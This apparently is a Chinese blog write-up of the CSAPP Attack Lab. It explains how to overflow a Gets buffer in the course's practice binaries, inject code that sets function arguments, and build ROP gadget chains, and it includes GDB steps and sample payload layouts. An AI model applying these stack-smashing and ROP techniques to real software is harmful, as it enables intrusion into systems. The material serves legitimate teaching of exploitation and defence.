---
title: CSAPP Attack Lab：缓冲区溢出、代码注入与 ROP
pubDate: 2026-05-09
description: 记录 Attack Lab 从栈帧侦察、返回地址覆盖到代码注入和面向返回编程的完整排查过程。
author: 眠云
slugId: csapp-attacklab-process
tags: ["csapp"]
category: "csapp"
draft: false
---

Attack Lab 不是“照着固定字符串输入就能过”的实验。每个人拿到的 cookie、缓冲区大小、函数地址和 gadget 地址都可能不同，所以真正可迁移的答案不是某一串十六进制，而是一套从二进制中重新发现答案的方法。

本文保留“观察现象—提出假设—执行验证—失败排查—修正布局—最终确认”的路径。个人 target、cookie、地址和通关字符串只作为格式示例，不能替代读者自己的侦察。

## 1. 实验目标和准备

### 1.1 目标文件

课程平台会为每个人生成专属 target 目录，典型内容包括：

- ctarget：栈位置相对固定，用于前三个代码注入阶段；
- rtarget：栈随机化且不可执行，用于后两个 ROP 阶段；
- cookie.txt：个人验证值；
- farm.c：gadget farm 源码；
- hex2raw：把十六进制字节转换成原始输入；
- README.txt：当前 target 的说明。

获取文件后解压并进入目录：

~~~shell
tar -xvf targetXXXX.tar
cd targetXXXX
cat cookie.txt
~~~

校内平台地址只在课程远程桌面中可用，公开文章不重复展示内网 URL。

### 1.2 先确认约束

目标函数通常类似：

~~~c
unsigned getbuf(void) {
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
~~~

Gets 不检查输入长度，输入超过 buf 后会继续覆盖栈上的数据，最关键的是保存的返回地址。

ctarget 的前三关是代码注入，rtarget 的两关是 ROP。输入不能包含字节 0x0a，因为 Gets 会把它当作换行结束符。hex2raw 要求每个字节写成两位十六进制，地址必须按小端序排列。

## 2. 通用侦察：先找去哪里和走多远

### 2.1 生成反汇编

~~~shell
objdump -d ctarget > ctarget.s
~~~

需要定位：

1. touch1、touch2、touch3 入口地址；
2. getbuf 开头分配的栈空间；
3. getbuf 结尾恢复栈并执行 ret 的位置；
4. 目标函数参数应放入哪个寄存器；
5. 输入文件和 q、i 等命令行参数的使用方式。

### 2.2 用 GDB 对齐栈布局

~~~text
gdb ctarget
disassemble getbuf
break *getbuf+偏移
run
info registers rsp rbp rip
x/32gx rsp
~~~

不要只根据 sub 指令猜偏移量。必须在 ret 前查看栈顶，确认它是否正好是保存的返回地址。

> **推理记录**
>
> - 现象：短输入时 getbuf 正常返回，长输入时程序状态被破坏。
> - 假设：输入覆盖了保存的返回地址。
> - 验证：在 ret 前检查栈顶的 8 字节。
> - 修正：调整填充长度，直到目标地址恰好出现在 ret 读取的位置。
> - 结论：Payload 是填充长度、新返回地址和后续数据的精确布局，不是随便填长字符串。

## 3. Phase 1：只覆盖返回地址，跳到 touch1

### 3.1 目标控制流

正常流程：

~~~text
test -> getbuf -> 返回 test
~~~

目标流程：

~~~text
test -> getbuf -> ret -> touch1
~~~

文档中的一次反汇编显示：

~~~asm
00000000004018cb <getbuf>:
  4018cb: sub $0x38,%rsp
  ...
  4018dc: add $0x38,%rsp
  4018e0: ret

00000000004018e1 <touch1>:
~~~

这一次 0x38 等于 56 字节，touch1 地址是 0x4018e1。它们只是当前 target 的观察结果。

### 3.2 构造小端序 Payload

理论布局：

~~~text
[56 字节填充][8 字节 touch1 地址]
~~~

地址 0x4018e1 在输入中应写成：

~~~text
e1 18 40 00 00 00 00 00
~~~

转换和运行：

~~~shell
./hex2raw < phase1.txt > phase1.raw
./ctarget -i phase1.raw
~~~

如果没有通过，在 ret 前检查：

~~~text
x/2gx rsp
si
info registers rip
~~~

### 3.3 推理记录

- 现象：程序崩溃或进入错误函数。
- 假设：目标地址或填充长度至少有一个错误。
- 验证：检查 ret 读取的地址和地址字节顺序。
- 修正：分别调整 padding 数量和小端序排列，不同时修改两个变量。
- 结论：先证明 ret 取到了什么，再判断控制流去了哪里。

## 4. Phase 2：设置第一个整数参数

### 4.1 新问题：不仅要跳转，还要传参

touch2 会检查第一个整数参数是否等于个人 cookie：

~~~c
void touch2(unsigned val) {
    if (val == cookie)
        validate(2);
    else
        fail(2);
}
~~~

x86-64 System V 调用约定规定，第一个整数参数放在 rdi。因此只把返回地址改成 touch2 会进入函数，但可能得到 Misfire。

### 4.2 先写汇编，再提取机器码

注入代码的逻辑是：

~~~asm
mov $COOKIE, %rdi
push $TOUCH2
ret
~~~

实验要求通过 ret 转移，不直接使用 jmp 或 call。写入临时汇编文件后，用汇编器和反汇编得到实际字节：

~~~shell
gcc -c phase2.s
objdump -d phase2.o
~~~

不要凭记忆手写立即数和寄存器编码。读取 objdump 输出后，再把 cookie、注入代码地址和 touch2 地址按小端序放入 Payload。

### 4.3 推理记录：Misfire 其实是进展

- 现象：输出 Misfire: You called touch2(...)。
- 判断：控制流已经进入 touch2，剩余问题是 rdi 里的值不等于 cookie。
- 验证：查看 cookie.txt，并在 touch2 入口前检查 rdi。
- 修正：只修正立即数编码、寄存器设置或字节序，不再盲目修改返回地址。
- 结论：失败信息可以定位已经成功的阶段，不能把所有问题都当作控制流错误。

## 5. Phase 3：传递字符串参数

### 5.1 从整数变成字符串指针

touch3 接收 char 指针，并在内部调用 hexmatch：

~~~c
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}
~~~

攻击字符串中必须包含 cookie 的 8 个十六进制字符，不带 0x，末尾还要有 C 字符串终止字节 00。

### 5.2 第一次失败：控制流正确但字符串为空

文档中出现过：

~~~text
Misfire: You called touch3("")
~~~

这个现象说明 touch3 已经被调用，注入代码也可能已经把 rdi 设置成了某个地址，但该地址第一个字节是 00，或字符串后来被覆盖。

### 5.3 重新规划字符串存储位置

hexmatch 的 cbuf 和 strncmp 都会使用栈空间，可能覆盖 getbuf 原来的缓冲区。修正过程：

1. 将 cookie 字符串放到后续函数不会覆盖的区域；
2. 让 rdi 指向新的稳定地址；
3. 在 touch3 入口检查 rdi；
4. 用 x/s 和字节查看确认字符串内容；
5. 单步进入 hexmatch，确认字符串在函数调用后仍然存在。

~~~text
break *touch3
run < phase3.raw
info registers rdi rsp
x/s rdi
x/16bx rdi
~~~

> **推理记录**
>
> - 现象：touch3 被调用，但打印参数为空。
> - 假设：控制流问题已经解决，剩下的是指针值或字符串生命周期问题。
> - 验证：入口处 x/s rdi；再单步观察 hexmatch 是否覆盖该内存。
> - 修正：把字符串移到安全区域，重新计算指针。
> - 结论：代码、返回地址和参数数据的排列必须结合后续栈使用共同设计。

## 6. 从 ctarget 转向 rtarget：为什么不能继续注入

rtarget 使用栈随机化，无法稳定预测注入代码地址；同时栈区域不可执行，即使 ret 跳到栈上也会触发段错误。

因此要复用程序已有的短代码片段，通过一串 ret 串联它们。gadget 只能从 start_farm 到 end_farm 的范围中选择。

常见 gadget：

~~~asm
mov %rax, %rdi
ret
~~~

栈上的数据负责提供 pop 的值，ret 负责取下一项地址。

## 7. Phase 4：用两个 gadget 设置整数参数

### 7.1 搜索 gadget

~~~shell
objdump -d rtarget > rtarget.s
~~~

在 start_farm 和 end_farm 范围内寻找：

- popq：把栈上的 cookie 取入寄存器；
- movq：把寄存器值转移到 rdi；
- ret：结束当前 gadget；
- nop：必要时调整编码或对齐。

不能使用范围外的普通程序代码作为 gadget。

### 7.2 ROP 栈布局

~~~text
[填充到保存返回地址]
[gadget A 地址]
[cookie 数据]
[gadget B 地址]
[touch2 地址]
~~~

执行过程：

1. ret 进入 gadget A；
2. gadget A 的 pop 把 cookie 从栈取入寄存器；
3. gadget A 的 ret 进入 gadget B；
4. gadget B 将值移动到 rdi；
5. gadget B 的 ret 进入 touch2。

### 7.3 推理记录：每个 pop 都会改变栈

- 现象：进入了 gadget，但下一步地址被当成数据，程序崩溃。
- 假设：某个 gadget 的额外 pop 没有计入 Payload。
- 验证：在每个 gadget 入口查看 rsp 和目标寄存器。
- 修正：将每条 pop 消耗的 8 字节都加入布局。
- 结论：ROP Payload 是“地址—数据—地址”的栈上程序。

## 8. Phase 5：用 ROP 传递字符串指针

这一阶段要让 touch3 收到 cookie 字符串的地址。除了 movq、popq、ret 和 nop，还允许使用 gadget farm 中的 movl 和功能性两字节指令。

通用构造过程：

1. 用 pop 将已知地址放入寄存器；
2. 用 mov 在寄存器之间转移；
3. 必要时用 movl 转移低 32 位；
4. 逐项计算每个 gadget 对 rsp 的消耗；
5. 最终让 rdi 指向 Payload 中不会被覆盖的字符串；
6. ret 进入 touch3。

文档中说明官方解法可能需要多个 gadget。不要把官方 gadget 地址当作固定答案；应根据自己的 rtarget 反汇编重新搜索。

## 9. HEX2RAW：把计划变成真实输入

HEX2RAW 的每个输入单元表示一个字节。若希望原始输入包含字符 012345 和结束字节，需要写：

~~~text
30 31 32 33 34 35 00
~~~

常用方式：

~~~shell
cat exploit.txt | ./hex2raw | ./ctarget
./hex2raw < exploit.txt > exploit-raw.txt
./ctarget < exploit-raw.txt
./hex2raw < exploit.txt > exploit-raw.txt
./ctarget -i exploit-raw.txt
~~~

第三种方式最方便与 GDB 配合。每个字节必须是两位十六进制，地址按小端序，不能出现 0a。

### 9.1 用汇编器确认编码

临时汇编：

~~~asm
pushq $0xabcdef
addq $17, %rax
movl %eax, %edx
~~~

编译反汇编：

~~~shell
gcc -c example.s
objdump -d example.o > example.d
~~~

从反汇编得到字节序列后再提交，避免手写机器码时发生立即数宽度、寄存器编码和字节序错误。

## 10. 最终复盘

Attack Lab 的排错可以归结为四个问题：

1. 控制流到哪里：保存返回地址是否被覆盖，ret 取出的值是什么；
2. 参数从哪里来：当前阶段要求整数还是字符串指针，参数寄存器是否正确；
3. 数据能活多久：后续函数会不会使用同一片栈空间；
4. 每一步消费多少栈：普通函数、pop gadget 和 ret 都会改变栈指针。

当阶段失败时，先根据输出判断失败发生在控制流、参数值、字符串内容还是合法性检查，不要盲目增加填充。这样才能把一次针对个人 target 的实验转化为可迁移的栈帧分析、机器码编码和 ROP 推理方法。
